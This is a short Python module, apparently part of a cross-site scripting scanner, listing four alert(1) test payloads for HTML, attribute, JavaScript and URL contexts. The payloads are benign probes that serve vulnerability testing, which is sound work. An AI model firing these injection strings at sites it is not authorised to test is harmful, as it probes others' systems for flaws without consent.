from core.payloads.base import Payload

HTML_PAYLOADS = [
    Payload("<script>alert(1)</script>", "html"),
]

ATTR_PAYLOADS = [
    Payload("\" onmouseover=alert(1) x=\"", "attribute"),
]

JS_PAYLOADS = [
    Payload("';alert(1);//", "javascript"),
]

URL_PAYLOADS = [
    Payload("javascript:alert(1)", "url"),
]

ALL_PAYLOADS = (
    HTML_PAYLOADS +
    ATTR_PAYLOADS +
    JS_PAYLOADS +
    URL_PAYLOADS
)
